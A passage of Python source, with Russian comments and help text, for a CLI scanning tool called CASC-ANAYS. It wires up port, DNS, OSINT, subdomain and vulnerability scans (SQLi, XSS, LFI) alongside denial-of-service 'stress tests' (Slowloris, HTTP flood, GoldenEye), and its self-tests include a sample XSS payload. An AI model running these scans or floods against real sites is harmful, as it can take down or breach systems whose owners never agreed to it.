        epilog=f"Автор: {AUTHOR} | GitHub: {GITHUB_URL} | Лицензия: {LICENSE}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=True,
    )

    # ==========================================================================
    # ГРУППА 1: ЦЕЛИ
    # ==========================================================================
    targets = parser.add_argument_group("🎯 ЦЕЛИ")
    targets.add_argument(
        "-t", "--target",
        metavar="DOMAIN/IP",
        help="Цель для анализа (домен или IP-адрес)"
    )
    targets.add_argument(
        "--targets-file",
        metavar="FILE",
        help="Файл со списком целей (по одной на строку, # — комментарий)"
    )
    targets.add_argument(
        "--list-targets",
        action="store_true",
        help="Показать список сохранённых целей из config.json"
    )
    targets.add_argument(
        "--add-target",
        metavar="TARGET",
        help="Добавить цель в config.json"
    )
    targets.add_argument(
        "--remove-target",
        metavar="TARGET",
        help="Удалить цель из config.json"
    )

    # ==========================================================================
    # ГРУППА 2: РЕЖИМЫ АНАЛИЗА
    # ==========================================================================
    modes = parser.add_argument_group("⚙️  РЕЖИМЫ АНАЛИЗА")
    modes.add_argument(
        "-f", "--full",
        action="store_true",
        help="Полный анализ цели (все модули)"
    )
    modes.add_argument(
        "-s", "--smart",
        action="store_true",
        help="Умный анализ (авто-подбор модулей по результатам разведки)"
    )
    modes.add_argument(
        "-i", "--interactive",
        action="store_true",
        help="Запустить интерактивный режим"
    )
    modes.add_argument(
        "-m", "--modules",
        metavar="MODULES",
        help="Список модулей через запятую: ports,http,dns,osint,subdomains,vuln,stress"
    )
    modes.add_argument(
        "--no-stress",
        action="store_true",
        help="Исключить стресс-тесты (только анализ)"
    )
    modes.add_argument(
        "--no-vuln",
        action="store_true",
        help="Исключить проверку уязвимостей"
    )
    modes.add_argument(
        "--no-subdomains",
        action="store_true",
        help="Исключить поиск поддоменов"
    )
    modes.add_argument(
        "--subdomain-brute",
        action="store_true",
        help="Использовать DNS-брутфорс поддоменов (медленно)"
    )

    # ==========================================================================
    # ГРУППА 3: РЕПОЗИТОРИИ
    # ==========================================================================
    repos = parser.add_argument_group("📦 РЕПОЗИТОРИИ")
    repos.add_argument(
        "--init-repos",
        action="store_true",
        help="Инициализировать все репозитории (клонировать/обновить)"
    )
    repos.add_argument(
        "--update-repos",
        action="store_true",
        help="Обновить существующие репозитории"
    )
    repos.add_argument(
        "--list-repos",
        action="store_true",
        help="Показать список всех репозиториев"
    )
    repos.add_argument(
        "--clean-repos",
        action="store_true",
        help="Удалить все клонированные репозитории"
    )
    repos.add_argument(
        "--all",
        action="store_true",
        help="Включить тяжёлые репозитории (seclists, spiderfoot и т.д.)"
    )
    repos.add_argument(
        "--parallel",
        action="store_true",
        help="Параллельное клонирование репозиториев"
    )
    repos.add_argument(
        "--install-deps",
        action="store_true",
        help="Установить зависимости репозиториев (pip/npm/go)"
    )

    # ==========================================================================
    # ГРУППА 4: ОТЧЁТЫ
    # ==========================================================================
    reports = parser.add_argument_group("📄 ОТЧЁТЫ")
    reports.add_argument(
        "-o", "--output",
        metavar="FILE",
        help="Путь к файлу отчёта (.html, .json, .csv, .md)"
    )
    reports.add_argument(
        "--format",
        choices=["html", "json", "csv", "md", "all"],
        default="both",
        help="Формат отчёта (по умолчанию: both = html + json)"
    )
    reports.add_argument(
        "--no-report",
        action="store_true",
        help="Не генерировать отчёты"
    )
    reports.add_argument(
        "--no-html",
        action="store_true",
        help="Не генерировать HTML-отчёт"
    )
    reports.add_argument(
        "--no-json",
        action="store_true",
        help="Не генерировать JSON-отчёт"
    )
    reports.add_argument(
        "--open",
        action="store_true",
        help="Открыть HTML-отчёт в браузере после генерации"
    )

    # ==========================================================================
    # ГРУППА 5: НАСТРОЙКИ
    # ==========================================================================
    settings = parser.add_argument_group("🔧 НАСТРОЙКИ")
    settings.add_argument(
        "--config",
        metavar="FILE",
        default="config.json",
        help="Путь к файлу конфигурации (по умолчанию: config.json)"
    )
    settings.add_argument(
        "--log-level",
        choices=["DEBUG", "INFO", "WARNING", "ERROR"],
        default="INFO",
        help="Уровень логирования (по умолчанию: INFO)"
    )
    settings.add_argument(
        "--log-file",
        metavar="FILE",
        help="Путь к файлу логов"
    )
    settings.add_argument(
        "--threads",
        type=int,
        default=10,
        help="Количество потоков (по умолчанию: 10)"
    )
    settings.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Таймаут запросов в секундах (по умолчанию: 10)"
    )
    settings.add_argument(
        "--output-dir",
        default="reports",
        help="Директория для отчётов (по умолчанию: reports)"
    )
    settings.add_argument(
        "--proxy",
        metavar="URL",
        help="Использовать прокси (например: socks5://127.0.0.1:9050)"
    )
    settings.add_argument(
        "--user-agent",
        metavar="UA",
        help="Кастомный User-Agent"
    )

    # ==========================================================================
    # ГРУППА 6: ДИАГНОСТИКА
    # ==========================================================================
    diag = parser.add_argument_group("🔬 ДИАГНОСТИКА")
    diag.add_argument(
        "--self-test",
        action="store_true",
        help="Запустить самотестирование всех модулей"
    )
    diag.add_argument(
        "--deps",
        action="store_true",
        help="Показать статус зависимостей"
    )
    diag.add_argument(
        "--system-info",
        action="store_true",
        help="Показать информацию о системе"
    )
    diag.add_argument(
        "--check-git",
        action="store_true",
        help="Проверить наличие git в системе"
    )

    # ==========================================================================
    # ГРУППА 7: ИНТЕРФЕЙС
    # ==========================================================================
    ui = parser.add_argument_group("🖥  ИНТЕРФЕЙС")
    ui.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Тихий режим (без баннера)"
    )
    ui.add_argument(
        "--debug",
        action="store_true",
        help="Отладочный режим (много логов)"
    )
    ui.add_argument(
        "--no-color",
        action="store_true",
        help="Отключить цвета (для логов в файл)"
    )
    ui.add_argument(
        "--yes", "-y",
        action="store_true",
        help="Автоматически подтверждать все запросы"
    )
    ui.add_argument(
        "--print-help",
        action="store_true",
        help="Показать расширенную справку с примерами"
    )

    # ==========================================================================
    # ИНФО
    # ==========================================================================
    parser.add_argument(
        "-v", "--version",
        action="version",
        version=f"CASC-ANAYS v{VERSION}"
    )

    return parser


# ==============================================================================
# РАСШИРЕННАЯ СПРАВКА
# ==============================================================================
def print_help_extended():
    """Красивая расширенная справка с примерами"""
    text = f"""
{Colors.purple('╔══════════════════════════════════════════════════════════════════════╗')}
{Colors.purple('║')}  {Colors.bold(Colors.light_purple('CASC-ANAYS v' + VERSION))} — Глобальный аналитический комплекс       {Colors.purple('║')}
{Colors.purple('║')}  {Colors.cyan('Анализ веб-сайтов | OSINT | Поддомены | Уязвимости | Стресс')}      {Colors.purple('║')}
{Colors.purple('╚══════════════════════════════════════════════════════════════════════╝')}

{Colors.bold_purple('ПРИМЕРЫ:')}

  {Colors.dim('# Полный анализ одного домена')}
  {Colors.cyan('casc-anays -t example.com --full')}

  {Colors.dim('# Умный анализ (авто-подбор модулей)')}
  {Colors.cyan('casc-anays -t example.com --smart')}

  {Colors.dim('# Интерактивный режим')}
  {Colors.cyan('casc-anays -i')}

  {Colors.dim('# Только порты и HTTP')}
  {Colors.cyan('casc-anays -t example.com -m ports,http')}

  {Colors.dim('# Без стресс-тестов (безопасно)')}
  {Colors.cyan('casc-anays -t example.com --full --no-stress')}

  {Colors.dim('# Список целей из файла')}
  {Colors.cyan('casc-anays --targets-file targets.txt --full -o report.html')}

  {Colors.dim('# Множество целей + CSV-отчёт')}
  {Colors.cyan('casc-anays --targets-file targets.txt --smart --format csv')}

  {Colors.dim('# Инициализация всех репозиториев')}
  {Colors.cyan('casc-anays --init-repos')}

  {Colors.dim('# Только конкретные репозитории + параллельно')}
  {Colors.cyan('casc-anays --init-repos --parallel')}

  {Colors.dim('# С зависимостями')}
  {Colors.cyan('casc-anays --init-repos --install-deps')}

  {Colors.dim('# Включить тяжёлые (SecLists ~1.5GB)')}
  {Colors.cyan('casc-anays --init-repos --all')}

  {Colors.dim('# Список репозиториев')}
  {Colors.cyan('casc-anays --list-repos')}

  {Colors.dim('# Самотестирование')}
  {Colors.cyan('casc-anays --self-test')}

{Colors.bold_purple('МОДУЛИ:')}
  {Colors.light_purple('ports')}       — Сканирование портов (TCP + UDP)
  {Colors.light_purple('http')}        — HTTP-анализ (заголовки, SSL, WAF, технологии)
  {Colors.light_purple('dns')}         — DNS-анализ (A/AAAA/MX/NS/TXT/CNAME/SOA)
  {Colors.light_purple('osint')}       — WHOIS, разведка
  {Colors.light_purple('subdomains')}  — Поддомены (crt.sh + Sublist3r + amass + subfinder)
  {Colors.light_purple('vuln')}        — Уязвимости (CVE, Nikto, SQLi, XSS, LFI)
  {Colors.light_purple('stress')}      — Стресс-тесты (Slowloris, HTTP-флуд, GoldenEye)

{Colors.bold_purple('ИНТЕРАКТИВНЫЙ РЕЖИМ:')}
  Запустите {Colors.cyan('casc-anays -i')} и выберите нужный пункт меню.
  Все результаты сохраняются в {Colors.cyan('./reports/')}.

{Colors.bold_purple('АВТОР:')}   {AUTHOR}
{Colors.bold_purple('GITHUB:')}  {GITHUB_URL}
{Colors.bold_purple('ЛИЦЕНЗИЯ:')} {LICENSE}
"""
    print(text)


# ==============================================================================
# САМОТЕСТИРОВАНИЕ
# ==============================================================================
def run_self_tests() -> bool:
    """
    Запускает самотестирование всех модулей
    Возвращает True, если все тесты прошли
    """
    print()
    print(Colors.bold_purple("╔" + "═" * 68 + "╗"))
    print(Colors.bold_purple("║" + " " * 20 + "CASC-ANAYS — САМОТЕСТИРОВАНИЕ" + " " * 20 + "║"))
    print(Colors.bold_purple("╚" + "═" * 68 + "╝"))
    print()

    passed = 0
    failed = 0
    tests: List[tuple] = []

    # ---------- 1. Utils ----------
    def test_utils():
        assert Utils.normalize_target("https://example.com/path") == "example.com"
        assert Utils.normalize_target("example.com:8080") == "example.com"
        assert Utils.get_domain_from_url("https://example.com/x") == "example.com"
        assert Utils.format_bytes(1024) == "1.00 KB"
        assert Utils.format_bytes(1048576) == "1.00 MB"
        assert Utils.is_valid_ip("8.8.8.8")
        assert not Utils.is_valid_ip("not-an-ip")
        assert Utils.is_valid_domain("example.com")
        assert not Utils.is_valid_domain("not a domain")
        assert Utils.safe_int("42") == 42
        assert Utils.safe_int("bad", 0) == 0
        return "Utils: 11 проверок"

    # ---------- 2. Target ----------
    def test_target():
        t = Target("example.com")
        assert t.is_valid()
        assert t.hostname == "example.com"

        t2 = Target("https://example.com:8443/path")
        assert t2.hostname == "example.com"
        assert t2.port == 8443
        assert t2.scheme == "https"

        t3 = Target("8.8.8.8")
        assert t3.is_ip
        assert t3.ip == "8.8.8.8"

        t4 = Target("127.0.0.1")
        assert t4.is_valid()
        assert t4.base_url("http") == "http://127.0.0.1"

        return "Target: 8 проверок"

    # ---------- 3. Config ----------
    def test_config():
        test_path = "test_config_casc.json"
        if os.path.exists(test_path):
            os.remove(test_path)

        cfg = Config(test_path)
        assert cfg.get('settings.timeout') == 10

        cfg.set('settings.timeout', 30)
        assert cfg.get('settings.timeout') == 30

        cfg.add_target("test.com")
        assert "test.com" in cfg.list_targets()

        cfg.remove_target("test.com")
        assert "test.com" not in cfg.list_targets()

        os.remove(test_path)
        return "Config: 5 проверок"

    # ---------- 4. Logger ----------
    def test_logger():
        log = Logger(log_file=None, level="DEBUG")
        log.debug("test")
        log.info("test")
        log.warning("test")
        log.error("test")
        log.success("test")
        assert log.level == 0
        log.set_level("ERROR")
        assert log.level == 3
        return "Logger: 2 проверки"

    # ---------- 5. PortScanner ----------
    def test_portscanner():
        log = Logger()
        scanner = PortScanner(log, timeout=0.5)
        t = Target("127.0.0.1")
        result = scanner.scan(t, ports=[99999, 99998], grab_banners=False)
        assert isinstance(result, dict)
        assert "ports" in result
        assert "open_count" in result
        assert result["open_count"] == 0  # эти порты точно закрыты
        return "PortScanner: 4 проверки"

    # ---------- 6. HTTPAnalyzer ----------
    def test_http_analyzer():
        log = Logger()
        analyzer = HTTPAnalyzer(log, timeout=3)
        # Проверяем только что класс создаётся и имеет нужные методы
        assert hasattr(analyzer, "analyze")
        assert hasattr(analyzer, "_check_ssl")
        assert hasattr(analyzer, "_detect_waf")
        assert hasattr(analyzer, "_detect_technologies")
        return "HTTPAnalyzer: 4 проверки"

    # ---------- 7. DNSAnalyzer ----------
    def test_dns_analyzer():
        log = Logger()
        analyzer = DNSAnalyzer(log)
        assert hasattr(analyzer, "analyze")
        # Тест на localhost
        t = Target("localhost")
        result = analyzer.analyze(t)
        assert isinstance(result, dict)
        assert "records" in result
        return "DNSAnalyzer: 3 проверки"

    # ---------- 8. OSINTModule ----------
    def test_osint():
        log = Logger()
        osint = OSINTModule(log)
        assert hasattr(osint, "whois")
        assert hasattr(osint, "analyze")
        return "OSINTModule: 2 проверки"

    # ---------- 9. CVEScanner ----------
    def test_cve():
        log = Logger()
        cve = CVEScanner(log)
        # Проверка offline базы
        vulns = cve._check_offline("apache", "2.4.49")
        assert len(vulns) > 0
        assert vulns[0][0] == "CVE-2021-41773"
        # Парсинг версий
        parsed = cve._parse_version_string("nginx/1.18.0")
        assert parsed.get("nginx") == "1.18.0"
        return "CVEScanner: 4 проверки"

    # ---------- 10. SQLiScanner ----------
    def test_sqli():
        log = Logger()
        sqli = SQLiScanner(log, timeout=2)
        assert hasattr(sqli, "scan")
        # Проверка детекта SQL-ошибки
        assert sqli._looks_like_sqli("You have an error in your SQL syntax")
        assert sqli._looks_like_sqli("Warning: mysql_fetch_array()")
        assert not sqli._looks_like_sqli("Hello world")
        return "SQLiScanner: 3 проверки"

    # ---------- 11. XSSScanner ----------
    def test_xss():
        log = Logger()
        xss = XSSScanner(log, timeout=2)
        assert hasattr(xss, "scan")
        assert hasattr(xss, "_is_reflected")
        assert xss._is_reflected("<script>alert(1)</script>", "<script>alert(1)</script>", "X")
        return "XSSScanner: 3 проверки"

    # ---------- 12. LfiScanner ----------
    def test_lfi():
        log = Logger()
        lfi = LfiScanner(log, timeout=2)
        assert hasattr(lfi, "scan")
        assert lfi._looks_like_lfi("root:x:0:0:root:/root:/bin/bash")
        assert not lfi._looks_like_lfi("Hello world")
        return "LfiScanner: 2 проверки"

    # ---------- 13. StressTester ----------
    def test_stress():
        log = Logger()
        st = StressTester(log, None)
        assert hasattr(st, "slowloris_test")
        assert hasattr(st, "http_flood_test")
        assert hasattr(st, "goldeneye_test")
        return "StressTester: 3 проверки"

    # ---------- 14. HTMLReportGenerator ----------
    def test_html_report():
        gen = HTMLReportGenerator(version=VERSION)
        test_results = {
            "test.com": {
                "hostname": "test.com",
                "ip": "1.2.3.4",
                "status": "completed",
                "duration": 1.5,
                "modules": {
                    "ports": {
                        "ports": {
                            80: {"service": "http", "risk": "normal", "banner": "nginx"},
                            443: {"service": "https", "risk": "normal", "banner": ""},
                        },
                        "open_count": 2,
                        "scanned": 100,
                    },
                    "http": {
                        "server": "nginx/1.18.0",
                        "status_code": 200,
                        "title": "Test Page",
                        "waf": None,
                        "scheme": "https",
                        "technologies": ["nginx"],
                    },
                },
            }
        }
        html = gen.generate(test_results)
        assert "<!DOCTYPE html>" in html
        assert "CASC-ANAYS" in html
        assert "test.com" in html
        assert "nginx" in html
        return "HTMLReport: 4 проверки"

    # ---------- 15. JSONReportGenerator ----------
    def test_json_report():
        gen = JSONReportGenerator()
        test_results = {"test.com": {"hostname": "test.com"}}
        j = gen.generate(test_results)
        data = json.loads(j)
        assert "meta" in data
        assert data["meta"]["generator"] == "CASC-ANAYS"
        assert "results" in data
        return "JSONReport: 3 проверки"

    # ---------- 16. CSVReportGenerator ----------
    def test_csv_report():
        gen = CSVReportGenerator()
        test_results = {
            "test.com": {
                "hostname": "test.com",
                "modules": {
                    "vuln": {
                        "sqli": [
                            {"name": "SQLi", "severity": "high", "description": "test"}
                        ]
                    }
                }
            }
        }
        csv_text = gen.generate(test_results)
        assert "Target" in csv_text
        assert "SQLi" in csv_text
        return "CSVReport: 2 проверки"

    # ---------- 17. MarkdownReportGenerator ----------
    def test_md_report():
        gen = MarkdownReportGenerator()
        test_results = {"test.com": {"hostname": "test.com", "modules": {}}}
        md = gen.generate(test_results)
        assert "# CASC-ANAYS" in md
        assert "test.com" in md
        return "MarkdownReport: 2 проверки"

    # ---------- 18. AppState ----------
    def test_app_state():
        state = AppState()
        state.start()
        time.sleep(0.01)
        state.stop()
        assert state.duration() >= 0.01
        state.inc_targets()
        assert state.targets_processed == 1
        s = state.summary()
        assert "duration" in s
        return "AppState: 3 проверки"

    # ---------- 19. ProgressBar ----------
    def test_progress_bar():
        with ProgressBar(3, prefix="Test") as pb:
            for i in range(1, 4):
                pb.update(i)
        return "ProgressBar: 1 проверка"

    # ---------- 20. Интеграция CascAnalys ----------
    def test_casc_integration():
        test_path = "test_casc_integration.json"
        if os.path.exists(test_path):
            os.remove(test_path)

        app = CascAnalys(config_path=test_path)
        assert hasattr(app, "analyze_target")
        assert hasattr(app, "smart_analyze")
        assert hasattr(app, "run")
        assert hasattr(app, "generate_report")
        assert hasattr(app, "generate_json_report")
        assert hasattr(app, "generate_csv_report")
        assert hasattr(app, "generate_markdown_report")
        assert len(app.ALL_MODULES) == 7

        if os.path.exists(test_path):
            os.remove(test_path)
        return "CascAnalys: 8 проверок"

    # ---------- Список всех тестов ----------
    tests = [
        ("Utils", test_utils),
        ("Target", test_target),
        ("Config", test_config),
        ("Logger", test_logger),
        ("PortScanner", test_portscanner),
        ("HTTPAnalyzer", test_http_analyzer),
        ("DNSAnalyzer", test_dns_analyzer),
        ("OSINTModule", test_osint),
        ("CVEScanner", test_cve),
        ("SQLiScanner", test_sqli),
        ("XSSScanner", test_xss),
        ("LfiScanner", test_lfi),
        ("StressTester", test_stress),
        ("HTMLReport", test_html_report),
        ("JSONReport", test_json_report),
        ("CSVReport", test_csv_report),
        ("MarkdownReport", test_md_report),
        ("AppState", test_app_state),
        ("ProgressBar", test_progress_bar),
        ("CascAnalys", test_casc_integration),
    ]

    # ---------- Запуск ----------
    for name, func in tests:
        try:
            result = func()
            passed += 1
            print(f"  {Colors.green('✓')} {name:20} {Colors.dim(result)}")
        except AssertionError as e:
            failed += 1
            print(f"  {Colors.red('✗')} {name:20} {Colors.red('AssertionError')}")
            print(f"      {Colors.dim(str(e)[:100])}")
        except Exception as e:
            failed += 1
            print(f"  {Colors.red('✗')} {name:20} {Colors.red(type(e).__name__)}")
            print(f"      {Colors.dim(str(e)[:100])}")

    # ---------- Итог ----------
    print()
    print(Colors.purple("  " + "─" * 66))
    total = passed + failed
    if failed == 0:
        print(Colors.green(f"  ✓ ВСЕ ТЕСТЫ ПРОЙДЕНЫ: {passed}/{total}"))
    else:
        print(Colors.red(f"  ✗ ПРОВАЛЕНО: {failed}/{total}"))
        print(Colors.green(f"  ✓ Пройдено:  {passed}/{total}"))
    print(Colors.purple("  " + "─" * 66))
    print()

    return failed == 0


# ==============================================================================
# ОТКРЫТИЕ ОТЧЁТА В БРАУЗЕРЕ
# ==============================================================================
def open_in_browser(path: str) -> bool:
    """Открывает файл в браузере по умолчанию"""
    try:
        import webbrowser
        webbrowser.open(f"file://{Path(path).absolute()}")
        return True
    except Exception:
        return False


# ==============================================================================
# ОБРАБОТКА ОТДЕЛЬНЫХ КОМАНД CLI
# ==============================================================================
def cmd_list_repos(app: "CascAnalys"):
    """Команда --list-repos"""
    print()
    app.repo_manager.print_list(group_by_category=True)
    print()
    stats = app.repo_manager.get_status_summary()
    print(f"  Всего: {stats['total']}  |  "
          f"Клонировано: {Colors.green(str(stats['cloned']))}  |  "
          f"Обновлено: {Colors.green(str(stats['updated']))}  |  "
          f"Ошибок: {Colors.red(str(stats['errors']))}")
    print(f"  Общий размер: {Colors.cyan(Utils.format_bytes(app.repo_manager.get_total_size()))}")
    print()


def cmd_clean_repos(app: "CascAnalys", yes: bool = False):
    """Команда --clean-repos"""
    if not yes:
        answer = input(Colors.yellow("  Удалить все репозитории? (y/N): ")).strip().lower()
        if answer != 'y':
            print(Colors.dim("  Отменено"))
            return
    if app.repo_manager.clean():
        print(Colors.green("  ✓ Все репозитории удалены"))
    else:
        print(Colors.red("  ✗ Не удалось удалить"))


def cmd_list_targets(app: "CascAnalys"):
    """Команда --list-targets"""
    targets = app.config.list_targets()
    if not targets:
        print(Colors.yellow("\n  Нет сохранённых целей"))
        return
    print(Colors.bold_purple(f"\n  СОХРАНЁННЫЕ ЦЕЛИ ({len(targets)})"))
    print(Colors.purple("  " + "─" * 50))
    for i, t in enumerate(targets, 1):
        print(f"    {Colors.cyan(str(i).rjust(2) + '.')} {t}")
    print()


def cmd_add_target(app: "CascAnalys", target: str):
    """Команда --add-target"""
    if app.config.add_target(target):
        print(Colors.green(f"  ✓ Добавлено: {target}"))
    else:
        print(Colors.yellow(f"  Уже есть: {target}"))


def cmd_remove_target(app: "CascAnalys", target: str):
    """Команда --remove-target"""
    if app.config.remove_target(target):
        print(Colors.green(f"  ✓ Удалено: {target}"))
    else:
        print(Colors.yellow(f"  Не найдено: {target}"))


def cmd_init_repos(app: "CascAnalys", args):
    """Команда --init-repos / --update-repos"""
    print(Colors.bold_purple("\n  ИНИЦИАЛИЗАЦИЯ РЕПОЗИТОРИЕВ"))
    print(Colors.purple("  " + "─" * 50))
    print(f"  Тяжёлые репо:  {'включены' if args.all else 'пропущены'}")
    print(f"  Параллельно:   {'да' if args.parallel else 'нет'}")
    print(f"  Зависимости:   {'да' if args.install_deps else 'нет'}")
    print()

    if not check_git():
        print(Colors.red("  ✗ git не найден в системе"))
        return

    app.init_repos(
        skip_heavy=not args.all,
        parallel=args.parallel,
        install_deps=args.install_deps,
    )


def cmd_deps():
    """Команда --deps"""
    print(Colors.bold_purple("\n  СТАТУС ЗАВИСИМОСТЕЙ"))
    print(Colors.purple("  " + "─" * 50))
    print_dependencies_status()


def cmd_system_info():
    """Команда --system-info"""
    print(Colors.bold_purple("\n  СИСТЕМНАЯ ИНФОРМАЦИЯ"))
    print(Colors.purple("  " + "─" * 50))
    info = Utils.get_system_info()
    print(f"  OS:      {info['os']} {info['os_release']}")
    print(f"  Python:  {info['python']}")
    print(f"  Arch:    {info['arch']}")
    print(f"  Host:    {info['hostname']}")
    print(f"  CWD:     {os.getcwd()}")
    print()


def cmd_check_git():
    """Команда --check-git"""
    if check_git():
        git_path = Utils.which("git")
        print(Colors.green(f"\n  ✓ git найден: {git_path}"))
        try:
            result = subprocess.run(
                ["git", "--version"],
                capture_output=True, text=True, timeout=5
            )
            print(f"  Версия: {result.stdout.strip()}")
        except Exception:
            pass
    else:
        print(Colors.red("\n  ✗ git не найден в PATH"))
    print()


# ==============================================================================
# ВЫВОД РЕЗУЛЬТАТОВ В КОНСОЛЬ
# ==============================================================================
def print_results(app: "CascAnalys"):
    """Красиво выводит результаты анализа в консоль"""
    if not app.results:
        return

    stats = app.get_stats()

    print()
    print(Colors.purple("╔" + "═" * 68 + "╗"))
    print(Colors.purple("║") + Colors.bold_purple(" " * 23 + "ИТОГИ АНАЛИЗА" + " " * 23) + Colors.purple("║"))
    print(Colors.purple("╚" + "═" * 68 + "╝"))

    # Сводка
    print()
    print(f"  {Colors.light_purple('Целей:')}        {stats['targets']}")
    print(f"  {Colors.light_purple('Портов:')}       {stats['total_ports']}")
    print(f"  {Colors.light_purple('Поддоменов:')}   {stats['total_subdomains']}")
    print(f"  {Colors.light_purple('Уязвимостей:')}  {stats['total_vulns']}")
    print()

    # По severity
    sev = stats['vulns_by_severity']
    if stats['total_vulns'] > 0:
        print(Colors.bold("  Уязвимости по severity:"))
        if sev['critical']:
            print(f"    {Colors.red('● Critical:')} {sev['critical']}")
        if sev['high']:
            print(f"    {Colors.red('● High:')}     {sev['high']}")
        if sev['medium']:
            print(f"    {Colors.yellow('● Medium:')}   {sev['medium']}")
        if sev['low']:
            print(f"    {Colors.green('● Low:')}      {sev['low']}")
        if sev['info']:
            print(f"    {Colors.cyan('● Info:')}     {sev['info']}")
        print()

    # По каждой цели
    for name, data in app.results.items():
        hostname = data.get("hostname", name)
        ip = data.get("ip") or "N/A"
        status = data.get("status", "unknown")
        duration = data.get("duration", 0)

        print(Colors.purple("  " + "─" * 66))
        print(f"  {Colors.bold_cyan('▶ ' + hostname)}  {Colors.dim(ip)}  {Colors.dim(f'[{status}, {Utils.format_duration(duration)}]')}")

        mods = data.get("modules", {})

        # Порты
        if "ports" in mods:
            ports_data = mods["ports"]
            ports = ports_data.get("ports", {})
            if ports:
                port_list = ", ".join(str(p) for p in sorted(ports.keys())[:15])
                extra = f" (+{len(ports) - 15})" if len(ports) > 15 else ""
                print(f"    {Colors.green('● Порты:')} {port_list}{extra}")
            else:
                print(f"    {Colors.dim('● Портов: нет')}")

        # HTTP
        if "http" in mods:
            http = mods["http"]
            server = http.get("server") or "N/A"
            waf = http.get("waf") or "нет"
            status_code = http.get("status_code") or "N/A"
            print(f"    {Colors.green('● HTTP:')}   {status_code}  {server}")
            if waf != "нет":
                print(f"    {Colors.yellow('● WAF:')}    {waf}")

        # SSL
        if "http" in mods and mods["http"].get("ssl"):
            ssl_info = mods["http"]["ssl"]
            days = ssl_info.get("days_left")
            if days is not None:
                color = Colors.green if days > 30 else Colors.yellow if days > 7 else Colors.red
                print(f"    {Colors.green('● SSL:')}    {color(str(days) + ' дн.')}")

        # DNS
        if "dns" in mods:
            records = mods["dns"].get("records", {})
            if records:
                rtypes = ", ".join(records.keys())
                print(f"    {Colors.green('● DNS:')}    {rtypes}")

        # OSINT
        if "osint" in mods:
            whois = mods["osint"].get("whois", {})
            registrar = whois.get("registrar")
            if registrar:
                print(f"    {Colors.green('● WHOIS:')}  {Utils.truncate(registrar, 50)}")

        # Поддомены
        if "subdomains" in mods:
            subs = mods["subdomains"]
            total = subs.get("total", 0)
            if total:
                sources = ", ".join(subs.get("sources", []))
                print(f"    {Colors.green('● Поддомены:')} {total}  ({Colors.dim(sources)})")

        # Уязвимости
        if "vuln" in mods:
            vuln = mods["vuln"]
            total = sum(len(v) for v in vuln.values() if isinstance(v, list))
            if total:
                print(f"    {Colors.red('● Уязвимости:')} {total}")
                for vtype, lst in vuln.items():
                    if not isinstance(lst, list) or not lst:
                        continue
                    for v in lst[:3]:
                        sev = (v.get("severity") or "info").lower()
                        sev_color = {
                            "critical": Colors.red,
                            "high": Colors.red,
                            "medium": Colors.yellow,
                            "low": Colors.green,
                            "info": Colors.cyan,
                        }.get(sev, Colors.dim)
                        name = v.get("name", "Vuln")
                        print(f"      {sev_color(f'[{sev.upper()}]')} {Utils.truncate(name, 60)}")
                    if len(lst) > 3:
                        print(f"      {Colors.dim(f'... и ещё {len(lst) - 3}')}")

        # Стресс
        if "stress" in mods:
            stress = mods["stress"]
            sl = stress.get("slowloris", {})
            hf = stress.get("http_flood", {})
            if sl or hf:
                parts = []
                if sl:
                    parts.append(f"Slowloris: {sl.get('connections', 0)}")
                if hf:
                    parts.append(f"HTTP-флуд: {hf.get('requests', 0)}")
                print(f"    {Colors.green('● Стресс:')}  {', '.join(parts)}")

    print(Colors.purple("  " + "─" * 66))
    print()


# ==============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
# ==============================================================================
def main():
    """Главная точка входа CASC-ANAYS"""
    parser = build_cli()
    args = parser.parse_args()

    # ---------- Тихий режим ----------
    if not args.quiet:
        print_banner()

    # ---------- Без аргументов — справка ----------
    if len(sys.argv) == 1:
        print_help_extended()
        return 0

    # ---------- Цвета ----------
    if args.no_color:
        global HAS_COLORAMA
        HAS_COLORAMA = False
        for attr in dir(Colors):
            if not attr.startswith('_') and attr.isupper():
                setattr(Colors, attr, '')

    # ---------- Расширенная справка ----------
    if args.print_help:
        print_help_extended()
        return 0

    # ---------- Диагностика (без инициализации приложения) ----------
    if args.deps:
        cmd_deps()
        return 0

    if args.system_info:
        cmd_system_info()
        return 0

    if args.check_git:
        cmd_check_git()
        return 0

    if args.self_test:
        success = run_self_tests()
        return 0 if success else 1

    # ---------- Создаём config.json, если нет ----------
    if not os.path.exists(args.config):
        created = create_default_config(args.config)
        if created and not args.quiet:
            print(Colors.green(f"  ✓ Создан конфиг: {args.config}"))

    # ---------- Инициализация приложения ----------
    try:
        app = CascAnalys(config_path=args.config)
    except Exception as e:
        print(Colors.red(f"\n  ✗ Ошибка инициализации: {e}"))
        if args.debug:
            traceback.print_exc()
        return 1

    # ---------- Применяем аргументы к конфигу ----------
    if args.log_level:
        app.set_log_level(args.log_level)
    if args.log_file:
        app.config.set('settings.log_file', args.log_file)
        app.logger.log_file = args.log_file
    if args.threads:
        app.config.set('settings.threads', args.threads)
    if args.timeout:
        app.config.set('settings.timeout', args.timeout)
    if args.output_dir:
        app.config.set('settings.output_dir', args.output_dir)
    if args.proxy:
        app.config.set('settings.use_proxy', True)
        app.config.set('settings.proxy_url', args.proxy)
    if args.user_agent:
        app.config.set('settings.user_agent', args.user_agent)
    if args.subdomain_brute:
        app.config.set('settings.subdomain_bruteforce', True)

    if args.debug:
        app.logger.set_level('DEBUG')
        app.logger.debug("Отладочный режим включён")

    # ---------- Обработка команд ----------
    try:
        # Список репозиториев
        if args.list_repos:
            cmd_list_repos(app)
            return 0

        # Очистка репозиториев
        if args.clean_repos:
            cmd_clean_repos(app, yes=args.yes)
            return 0

        # Список целей
        if args.list_targets:
            cmd_list_targets(app)
            return 0

        # Добавить цель
        if args.add_target:
            cmd_add_target(app, args.add_target)
            return 0

        # Удалить цель
        if args.remove_target:
            cmd_remove_target(app, args.remove_target)
            return 0

        # Инициализация репозиториев
        if args.init_repos or args.update_repos:
            cmd_init_repos(app, args)
            return 0

        # ---------- Интерактивный режим ----------
        if args.interactive:
            # Загружаем цели из конфига
            if not app.targets:
                for t in app.config.list_targets():
                    app.add_target(t)

            mode = InteractiveMode(app)
            mode.run()
            return 0

        # ---------- Анализ ----------
        if args.target or args.targets_file:
            if not (args.full or args.smart):
                print(Colors.yellow(
                    "\n  Укажите режим анализа: --full или --smart\n"
                    "  Пример: casc-anays -t example.com --full"
                ))
                return 1

            # Запуск
